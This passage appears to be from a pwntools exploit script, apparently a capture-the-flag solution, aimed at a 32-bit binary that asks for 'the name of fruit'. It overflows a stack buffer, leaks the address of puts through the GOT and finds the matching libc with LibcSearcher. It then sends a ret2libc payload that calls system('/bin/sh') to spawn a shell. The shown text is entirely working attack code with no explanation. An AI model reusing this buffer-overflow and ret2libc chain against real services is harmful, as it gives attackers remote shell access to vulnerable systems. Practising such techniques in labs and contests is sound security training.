...
# bss addr: 0x804a040
payload = (0xa4 + 0x4) * b'a' + p32(cur_elf.sym['puts']) + p32(cur_elf.sym['getfruit']) + p32(cur_elf.got['puts'])
io.sendlineafter('Please input the name of fruit:', payload)
msg = io.recv()
put_addr = msg[0xc0-1-4 : 0xc0 - 1]
put_addr = u32(put_addr)
LOG_ADDR('put_addr', put_addr)

libc = LibcSearcher('puts', put_addr)
libc_base = put_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
if DEBUG:
    str_bin_sh = libc_base + 0x15bb0b
else:
    str_bin_sh = libc_base + libc.dump('str_bin_sh')
LOG_ADDR('libc_base', libc_base)

payload = (0xa4 + 0x4) * b'a' + p32(system_addr) + p32(0xdeadbeef) + p32(str_bin_sh)
io.sendline(payload)
